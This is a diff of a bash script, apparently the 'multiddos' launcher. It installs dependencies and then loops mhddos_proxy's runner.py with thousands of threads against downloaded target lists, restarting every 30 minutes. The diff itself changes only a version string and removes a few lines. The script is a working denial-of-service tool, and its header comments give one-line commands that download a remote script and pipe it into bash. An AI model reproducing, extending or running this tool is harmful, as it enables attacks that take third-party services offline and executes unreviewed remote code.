@@ -1,11 +1,10 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.0.1b\n"
+clear && echo -e "Loading... v1.0.2\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
 rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
 
 gotop="on"
@@ -112,7 +111,6 @@ while [ "$1" != "" ]; do
         --L ) export ddos_size="L"; shift ;;
         --XL ) export ddos_size="XL"; shift ;;
         --XXL ) export ddos_size="XXL"; shift ;;
-#        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -158,6 +156,7 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
+    
 sleep 30m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
